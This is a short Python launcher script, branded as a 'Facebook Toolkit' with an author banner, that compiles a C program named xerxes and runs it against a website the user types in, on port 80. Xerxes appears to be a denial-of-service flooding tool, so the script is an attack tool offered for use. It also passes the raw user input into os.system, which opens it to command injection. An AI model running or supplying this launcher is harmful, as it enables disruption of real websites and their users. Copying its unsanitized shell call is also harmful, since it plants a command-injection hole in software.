import os
os.system("clear")
print("""
######## ########     ########  #######   #######  ##       ##    ## #### ########
##       ##     ##       ##    ##     ## ##     ## ##       ##   ##   ##     ##
##       ##     ##       ##    ##     ## ##     ## ##       ##  ##    ##     ##
######   ########        ##    ##     ## ##     ## ##       #####     ##     ##
##       ##     ##       ##    ##     ## ##     ## ##       ##  ##    ##     ##
##       ##     ##       ##    ##     ## ##     ## ##       ##   ##   ##     ##
##       ########        ##     #######   #######  ######## ##    ## ####    ##
╔════════════════════════════════════════════════════════════════════════════════╗
║ [✓] Author     : Rodel C Tarrayo Jr                                            ║
║ [✓] Tool       : Facebook Toolkit                                              ║
║ [✓] Status     : Premium                                                       ║
║ [✓] System     : Data & Wi-Fi                                                  ║
║ [✓] GitHub     : HAXOR-BD1                                                     ║
║ [✓] Facebook   : Rodel C Tarrayo Jr.                                           ║
║ [✓] Version    : 1.5                                                           ║
║ [✓] Added Tool : 4                                                             ║
╚════════════════════════════════════════════════════════════════════════════════╝""")
os.system("chmod +x xerxes.c")
os.system("gcc xerxes.c -o xerxes")
a = input("\n Enter website address eg : www.fakesite.com \n Website Name : ")
os.system("./xerxes "+a+" 80")
